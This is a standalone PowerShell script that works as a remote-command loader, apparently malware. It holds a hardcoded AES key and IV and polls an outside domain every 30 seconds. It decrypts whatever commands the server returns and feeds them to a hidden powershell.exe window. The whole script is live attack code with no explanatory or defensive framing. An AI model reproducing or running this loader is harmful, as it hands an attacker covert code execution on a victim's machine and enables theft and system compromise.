function ConvertFromBase64 {
    param (
        [string]$InputString
    )
    return [Convert]::FromBase64String($InputString)
}

$key =ConvertFromBase64 -InputString "acmV6Ih7VbA4E4LcUihdeAnETO81W1hy3qGVQ0PzB68="
$iv = ConvertFromBase64 -InputString "+HLHPbMyeMTYRp43jfhccg=="
function DFC {
    param (
        [byte[]]$inputBytes,
        [byte[]]$key,
        [byte[]]$iv
    )
    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $ms = New-Object IO.MemoryStream
        $cs = New-Object Security.Cryptography.CryptoStream($ms, $aes.CreateDecryptor(), [Security.Cryptography.CryptoStreamMode]::Write)
        $cs.Write($inputBytes, 0, $inputBytes.Length)
        $cs.FlushFinalBlock()
        $decryptedBytes = $ms.ToArray()
        $cs.Close()
        $ms.Close()
        $aes.Dispose()
        return $decryptedBytes
    }
    catch {
        Write-Host "Decryption Error: $($_.Exception.Message)"
        return $null
    }
}


while ($true) {
    try {
        $r = Invoke-RestMethod -Uri "https://activatorcounter.com/connect"
        if ($r -ne '') {
            $buf = ConvertFromBase64 -InputString $r
            $decryptedBytes = DFC $buf $key $iv
            if ($null -ne $decryptedBytes) {
                $decryptedText = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                $lines = $decryptedText.Split("`r`n")
                $p = [Diagnostics.Process]::new()
                $p.StartInfo.WindowStyle = 'Hidden'
                $p.StartInfo.FileName = 'powershell.exe'
                $p.StartInfo.UseShellExecute = $false
                $p.StartInfo.RedirectStandardInput = $true
                $p.StartInfo.RedirectStandardOutput = $true
                $p.Start()
                $p.BeginOutputReadLine()
                foreach ($line in $lines) {
                    if ($line.Trim() -ne '') {
                        $p.StandardInput.WriteLine($line)
                    }
                }
                $p.StandardInput.WriteLine('')
                $p.WaitForExit()
                break
            }
        }
    }
    catch {
        Write-Host "Error: $($_.Exception.Message)"
    }
    Start-Sleep 30
}